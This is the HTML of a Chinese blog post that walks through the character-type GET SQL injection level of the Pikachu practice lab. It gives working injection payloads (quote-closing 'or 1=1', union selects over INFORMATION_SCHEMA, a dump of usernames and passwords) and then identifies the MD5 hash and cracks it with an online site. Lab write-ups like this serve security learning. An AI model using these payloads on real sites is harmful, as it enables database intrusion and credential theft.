@@ -1,0 +1,237 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>pikachu解题漏洞报告-SQL-Inject字符型注入(get) - Hexo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="SQL-Inject字符型注入(get)参考链接https://blog.csdn.net/witwitwiter/article/details/115938695
+解题过程1.登录靶场后发现有输,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="pikachu解题漏洞报告-SQL-Inject字符型注入(get) - Hexo"/>
+    <meta name="twitter:description" content="SQL-Inject字符型注入(get)参考链接https://blog.csdn.net/witwitwiter/article/details/115938695
+解题过程1.登录靶场后发现有输,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="Hexo"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="pikachu解题漏洞报告-SQL-Inject字符型注入(get) - Hexo"/>
+    <meta property="og:description" content="SQL-Inject字符型注入(get)参考链接https://blog.csdn.net/witwitwiter/article/details/115938695
+解题过程1.登录靶场后发现有输,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Hexo</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">pikachu解题漏洞报告-SQL-Inject字符型注入(get)</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">pikachu解题漏洞报告-SQL-Inject字符型注入(get)</h1>
+        <div class="stuff">
+            <span>三月 17, 2022</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h1 id="SQL-Inject字符型注入-get"><a href="#SQL-Inject字符型注入-get" class="headerlink" title="SQL-Inject字符型注入(get)"></a>SQL-Inject字符型注入(get)</h1><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/witwitwiter/article/details/115938695">https://blog.csdn.net/witwitwiter/article/details/115938695</a></p>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>1.登录靶场后发现有输入框，里面能输入字符串,随便输入一个之前有的用户，比如lucy</p>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220317140728.png" alt="20220317140728"></p>
+<p>2.返回两个字段，uid和email，因为是get请求方式，所以在url中也可以看到请求的内容lucy</p>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220317140827.png" alt="20220317140827"></p>
+<p>对比之前做得post的在url中就没有查询的内容</p>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220317141047.png" alt="20220317141047"></p>
+<p>3.以这个输入框作为注入点进行注入，这里需要用单引号或#构造闭合才能构造合法的SQL语句</p>
+<pre><code>lucy&#39; order by 3 #&#39;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220317142939.png" alt="20220317142939"></p>
+<p>4.返回错误，说明只有两个字段</p>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220317142334.png" alt="20220317142334"></p>
+<p>5.猜测后台使用的SQL语句是 select 用户名 邮箱 from 用户表 where name &#x3D; ‘username’ #在后台数据库中username不打单引号是会报错的,username就是我们在输入框输入的名字</p>
+<p>6.构造payload，lucy or 1&#x3D;1 但是仅仅这样会报错，因为会把我们输入的所有内容当作一个字符串，变成：<br>select 用户名 邮箱 from 用户表 where name &#x3D; ‘lucy or 1&#x3D;1’所以需要构造闭合。构造合法的SQL语句lucy’ or 1&#x3D;1 #’       其中lucy’和第5步提到的后台中username前面的单引号闭合掉，#’把username后面的单引号闭合掉  变成select 用户名 邮箱 from 用户表 where name &#x3D; ‘lucy’ or 1&#x3D;1 #’’</p>
+<pre><code>lucy&#39; or 1=1 #&#39;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220317150343.png" alt="20220317150343"></p>
+<p>7.成功返回了所有用户名及邮箱</p>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220317150123.png" alt="20220317150123"></p>
+<p>8.第6步也可以直接在url提交，不过要做url编码</p>
+<p>9.利用union，使用union select database(),user() 爆破当前数据库名字和用户名</p>
+<pre><code>lucy&#39; union select database(),user() #&#39;
+</code></pre>
+<p>10.根据返回信息，获得数据库为pikachu用户名为root</p>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220317151443.png" alt="20220317151443"></p>
+<p>11.第9步输入的payload还可以是x union select database(),user() </p>
+<pre><code>x&#39; union select database(),user() #&#39;
+</code></pre>
+<p>就不会再返回lucy的id序号和邮箱，直接返回数据库和用户名</p>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220317151918.png" alt="20220317151918"></p>
+<p>12.利用查出来的数据库名称pikachu   构建payload为 x union select TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA &#x3D; ‘pikachu’  来查询数据库中的表名。</p>
+<pre><code>x&#39; union select TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = &#39;pikachu&#39; #&#39;
+</code></pre>
+<p>13.返回结果的表名httpinfo member message users xssblind中，有users的表名</p>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220317152548.png" alt="20220317152548"></p>
+<p>14.继续利用之前查出来的数据库名称pikachu、和表名users构建payload 为 x union select TABLE_NAME,COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA &#x3D; ‘pikachu’ and TABLE_NAME &#x3D; ‘users’  查询表中的列名</p>
+<pre><code>x&#39; union select TABLE_NAME,COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = &#39;pikachu&#39; and TABLE_NAME = &#39;users&#39; #&#39;
+</code></pre>
+<p>15.返回结果获得users表中的列名为id username password level</p>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220317152944.png" alt="20220317152944"></p>
+<p>16.由于联合查询需要前后两个SQL语句的列名数一样，所以这里只能用两个列名进行查询，故使用x union select username,password from users  查询users表中的username和password字段。</p>
+<pre><code>x&#39; union select username,password from users #&#39;
+</code></pre>
+<p>17.根据返回结果，可得用户名pikachu的密码670b14728ad9902aecba32e22fa4f6bd</p>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220317155536.png" alt="20220317155536"></p>
+<p>18.使用kali的自带工具hash-identifier判断pikachu用户的密码的哈希类型</p>
+<pre><code>hash-identifier
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220317155958.png" alt="20220317155958"></p>
+<p>19.填入pikachu的密码670b14728ad9902aecba32e22fa4f6bd</p>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220317160040.png" alt="20220317160040"></p>
+<p>20.得到哈希类型为MD5，打开在线MD5网站<a target="_blank" rel="noopener" href="https://www.cmd5.com/%E8%A7%A3%E5%AF%86">https://www.cmd5.com/解密</a></p>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220317160159.png" alt="20220317160159"></p>
+<p>21.得到密码000000，同理可得到其他用户密码，但是pikachu是root用户，其他的没必要了</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="https://link.jscdn.cn/1drv/aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBb05yS01seWpjbkZnMHNkazB1a3lqNl9kMl82P2U9aDgxYUZQ.wav"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="https://link.jscdn.cn/1drv/aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBb05yS01seWpjbkZnMHhtbVE0d01TYUZqQ2w4P2U9MGpOaFVZ.wav"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="false"
+        data-ae="false"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Inject%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5-get"><span class="toc-number">1.</span> <span class="toc-text">SQL-Inject字符型注入(get)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.1.</span> <span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">解题过程</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
